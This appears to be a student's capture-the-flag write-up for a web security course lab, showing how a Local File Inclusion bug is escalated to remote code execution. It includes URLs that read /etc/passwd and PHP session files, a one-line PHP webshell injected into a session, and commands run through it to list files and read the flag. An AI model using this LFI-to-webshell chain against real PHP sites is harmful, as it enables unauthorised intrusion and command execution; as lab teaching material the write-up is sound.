---
title: Simple Web 0x07(Lab - HakkaMD)
tags: [NTUSTWS, CTF, Web]

category: "Security Course｜NTUST WS｜LFI"
date: 2023-01-31
---

# Simple Web 0x07(Lab - HakkaMD)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8401

## Background
[資安這條路-Local File Inclusion](https://ithelp.ithome.com.tw/articles/10241555)

## Exploit - LFI to RCE
1. First things first, the website has `LFI` problem
    > `http://h4ck3r.quest:8401/?module=/etc/passwd`
    ![](https://i.imgur.com/Efl4E0c.png)
2. <span style="background-color: yellow">通靈</span>
It provided `phpinfo()` so that we can check the save address of session.
![](https://i.imgur.com/SO727sY.png)
The setting is default, thus we can use `LFI` to read session file:
`http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1`
![](https://i.imgur.com/AiLGZJA.png)
We can see that session file store the data of what we enter. Therefore, we could enter `webshell` to get shell
4. `webshell`
    ```
    <?php system($_GET['sh']); ?>
    ↓
    http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&sh=ls%20/
    ↓
    ```
    ![](https://i.imgur.com/kqlIf6z.png)
    ```
    ↓
    http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&sh=cat%20/flag_aff6136bbef82137
    ```
4. Then we got flag!!!